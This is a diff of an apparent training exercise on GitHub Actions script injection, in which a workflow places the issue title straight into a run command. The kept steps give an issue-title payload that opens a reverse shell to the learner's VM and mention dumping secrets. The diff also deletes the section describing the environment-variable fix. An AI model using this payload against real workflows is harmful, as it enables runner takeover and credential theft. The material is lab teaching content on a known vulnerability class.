@@ -1,5 +1,4 @@
-# Exercise 1 - Script injection in the run command
-## :bomb: Exploiting the script injection vulnerability in the run command
+# Exercise 1 - :bomb: Exploiting the script injection vulnerability in the run command
 The [Check issue title workflow](.github/workflows/check-issue-title.yml) uses the issue title in the `run` command as follows:
 ```
 title="${{ github.event.issue.title }}"
@@ -48,24 +47,4 @@ Now let's try something a little more sinister...
 3. Next open a new issue in your repo with the title `octocat"; bash -i >& /dev/tcp/<YOUR-VM-IP-ADDRESS>/1337 0>&1 ; ls -l $GITHUB_WORKSPACE"`, replacing `<YOUR-VM-IP-ADDRESS>` with the public IP address of your cloud VM. This will cause the workflow to pipe the bash shell to your VM's IP address on port 1337.  
 4. Now return to the command prompt window. As the worklfow runs, you will see your command prompt window drop into a shell on the runner. Now you have a shell on the runner! This is a great "foot in the door" from which I can attemp other exploits, like dumping secrets or cloud credentials to use in other attacks.  
 
-## :lock: Fixing the script injection vulnerability in the run command
-The run command will create a script from its input and run that script. The run command does not know the difference between commands and data. Therefore, when user input is put directly into the run command, there is a script injection vulnerability that can be exploited as we just did.  
-
-The way to mitigate this vulnerability is to put the user input into an environment variable, which is not used to generate the script that the run command executes.  
-
-Let's edit the [Check issue title workflow](.github/workflows/check-issue-title.yml) to use an environment variable that we set using the user input.
-
-1. Open the file [.github/workflows/check-issue-title.yml](.github/workflows/check-issue-title.yml)  
-2. Add an environment variable section to the `Check issue title` step...
-```
-      - name: Check issue title
-        env:
-            ISSUE_TITLE: ${{ github.event.issue.title }}
-```
-3. Use the new environment variable in the run command...
-```
-          title="$ISSUE_TITLE"
-```
-4. Test this out by [creating a new issue as we did above](#create-an-issue-with-the-exploit-payload).  
-5. Notice that the `ls -s $GITHUB_WORKSPACE` command does not appear in the output as it did previously.  
 
